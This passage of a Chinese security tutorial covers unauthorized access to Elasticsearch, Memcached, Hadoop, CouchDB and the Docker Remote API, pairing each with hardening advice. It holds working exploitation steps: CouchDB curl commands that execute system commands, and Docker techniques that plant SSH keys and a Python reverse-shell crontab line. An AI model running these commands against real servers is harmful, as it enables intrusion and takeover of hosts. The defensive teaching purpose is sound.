3、绑定指定 IP 访问
#### 0x06 Elasticsearch 未授权访问
##### 6.1 漏洞描述
Elasticsearch 是一款 java 编写的企业级搜索服务。越来越多的公司使用 ELK
作为日志分析，启动此服务默认会开放9200端口，可被非法操作数据
##### 6.2 漏洞利用
漏洞检测：默认端口9200
相当于一个API，任何人访问这个地址，就可以调用api，进行数据的增删改操作。
http://x.x.x.x:9200/_nodes
http://x.x.x.x:9200/_river
##### 6.3 漏洞加固
1、防火墙上设置禁止外网访问 9200 端口。
2、使用 Nginx 搭建反向代理，通过配置 Nginx 实现对 Elasticsearch 的认证
3、限制IP访问，绑定固定IP
4、在`config/elasticsearch.yml`中为 9200 端口设置认证：
    http.basic.enabled true #开关，开启会接管全部HTTP连接
    http.basic.user "admin" #账号
    http.basic.password "admin_pw" #密码
    http.basic.ipwhitelist ["localhost", "127.0.0.1"]
#### 0x07 Memcache 未授权访问
##### 7.1 漏洞描述
Memcached 是一套常用的 key-value 缓存系统，由于它本身没有权限控制模块，所以对公网开放的 Memcache
服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取 Memcached 中的敏感信息。
##### 7.2 漏洞利用
1、登录机器执行`netstat -an |more`命令查看端口监听情况。回显 0.0.0.0:11211 表示在所有网卡进行监听，存在
memcached 未授权访问漏洞。
2、`telnet  11211`，或`nc -vv  11211`，提示连接成功表示漏洞存在
##### 7.3 漏洞加固
1、设置 memchached 只允许本地访问
2、禁止外网访问 Memcached 11211 端口
3、编译时加上–enable-sasl，启用SASL认证
#### 0x08 Hadoop 未授权访问
##### 8.1 漏洞描述
由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web
端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。
##### 8.2 漏洞利用
主要 HDFS 和 MapReduce 的 WebUI 对应的服务端口。
其中比较重要的是 DataNode 默认端口 50075 开放的话，攻击者可以通过 hdsf 提供的 restful api 对 hdfs
存储数据进行操作。
restful api参考：
##### 8.3 漏洞加固
1、如无必要，关闭 Hadoop Web 管理页面
2、开启身份验证，防止未经授权用户访问
3、设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI
等相关端口，详细端口列表如下：
a)HDFS
  * NameNode 默认端口 50070
  * DataNode 默认端口 50075
  * httpfs 默认端口14000
  * journalnode 默认端口 8480
b)YARN（JobTracker）
  * ResourceManager 默认端口8088
  * JobTracker 默认端口 50030
  * TaskTracker 默认端口 50060
c)Hue 默认端口 8080
d)YARN（JobTracker）
  * master 默认端口 60010
  * regionserver 默认端口60030
e)hive-server2 默认端口 10000
f)spark-jdbcserver 默认端口 10003
#### 0x09 CouchDB 未授权访问
##### 9.1 漏洞描述
CouchDB 默认在 5984 端口开放 Restful 的 API 接口，用于数据库的管理功能。其 HTTP Server
默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过 API 访问导致未授权访问。任何连接到服务器端口上的人，都可以调用相关 API
对服务器上的数据进行任意的增删改查，其中通过 API 修改 local.ini 配置文件，可进一步导致执行任意系统命令，获取服务器权限！
##### 9.2 漏洞利用
新增query_server配置，这里执行ifconfig命令
    curl -X PUT 'http://x.x.x.x:5984/_config/query_servers/cmd' -d '"/sbin/ifconfig >/tmp/6666"'
新建一个临时表，插入一条记录
    curl -X PUT 'http://x.x.x.x:5984/vultest'
    curl -X PUT 'http://x.x.x.x:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
调用query_server处理数据
    curl -X POST 'http://x.x.x.x:5984/vultest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json'
当然你也可以直接执行其他命令，下载个其他什么的
##### 9.3 漏洞加固
1、指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到
“bind_address = 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。
2、设置访问密码 （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 中找到“[admins]”字段配置密码
#### 0x010 Docker 未授权访问
##### 10.1 漏洞描述
Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。通过 docker client 或者 http
直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell
##### 10.2 漏洞利用
http://192.168.198.130:2375/v1.25/images/json 可以获取到所有的 images 列表
http://host:2375/containers/json
会返回服务器当前运行的 container 列表，和在 docker CLI 上执行 docker ps 的效果一样，过 Post
包我们还可以新建、开启和关闭容器，其他操作比如拉取 image 等操作也都可以通过 API 调用完成。
    $ curl http://10.10.10.10:2375/containers/json
    []
    docker -H=tcp://10.10.10.10:2375 ps         
    CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
Docker remote Api 未授权访问的攻击原理与之前的 Redis
未授权访问漏洞大同小异，都是通过向运行该应用的服务器写文件，从而拿到服务器的权限，常见的利用方法如下:
1、启动一个容器，挂载宿主机的/root/目录，之后将攻击者的ssh公钥~/.ssh/id_rsa.pub的内容写到入宿主机的`/root/.ssh/authorized_keys`文件中，之后就可以用root账户直接登录了
2、启动一个容器，挂载宿主机的/etc/目录，之后将反弹shell的脚本写入到/etc/crontab中，攻击者会得到一个反弹的shell，其中反弹shell脚本的样例如下：
    echo -e "*/1 * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n" >> /etc/crontab
第2种利用方法也可以挂载
var/spool/cron/目录，将反弹shell的脚本写入到/var/spool/cron/root（centos系统）或/var/spool/cron/crontabs/root(ubuntu系统)
##### 10.3 漏洞加固
###### 1、在不必需的情况下，不要启用 docker 的 remote api 服务，如果必须使用的话，可以采用如下的加固方式：
设置 ACL，仅允许信任的来源 IP 连接；
设置 TLS 认证，官方的文档为 Protect the Docker daemon socket
###### 2、客户端连接时需要设置以下环境变量 export DOCKER_TLS_VERIFY=1
    export DOCKER_CERT_PATH=~/.docker
    export DOCKER_HOST=tcp://10.10.10.10:2375
    export DOCKER_API_VERSION=1.12
###### 3、在 docker api 服务器前面加一个代理，例如 nginx，设置 401 认证
附：Python未授权访问脚本
此脚本未做测试，请根据自身需求，修改测试使用！
#### 参考文章
  * 
  * 
  * 
  * 
  * 
  * 
  * 
  * 
* * *